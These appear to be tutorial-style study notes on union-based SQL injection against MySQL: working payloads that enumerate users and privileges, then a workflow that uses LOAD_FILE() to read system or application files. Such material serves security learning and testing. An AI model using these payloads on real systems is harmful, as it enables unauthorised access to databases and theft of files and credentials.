## **Reading Files**

- Queries to Find the Current User : `SELECT USER();` or `SELECT CURRENT_USER();` or `SELECT user FROM mysql.user;`

**Checking User Privileges :** `SELECT super_priv FROM mysql.user;`

Union payload : 

`cn' UNION SELECT
1,
super_priv,
3,
4
FROM mysql.user-- -`

If there are multiple users, we can filter for only the current user.

`cn' UNION SELECT
1,
super_priv,
3,
4
FROM mysql.user
WHERE user="root"-- -`

**Listing All User Privileges**

`cn' UNION SELECT
1,
grantee,
privilege_type,
4
FROM information_schema.user_privileges-- -`

If there are many users, filter only the current user.

`cn' UNION SELECT
1,
grantee,
privilege_type,
4
FROM information_schema.user_privileges
WHERE grantee="'root'@'localhost'"-- -`

**LOAD_FILE()**

`SELECT LOAD_FILE('/path/to/file');` reads the contents of a file.

**Reading Files Workflow**

```
1. Find the current DB user
          ↓
2. Check user privileges
          ↓
3. Confirm the FILE privilege
          ↓
4. Use LOAD_FILE()
          ↓
5. Read system or application files
```
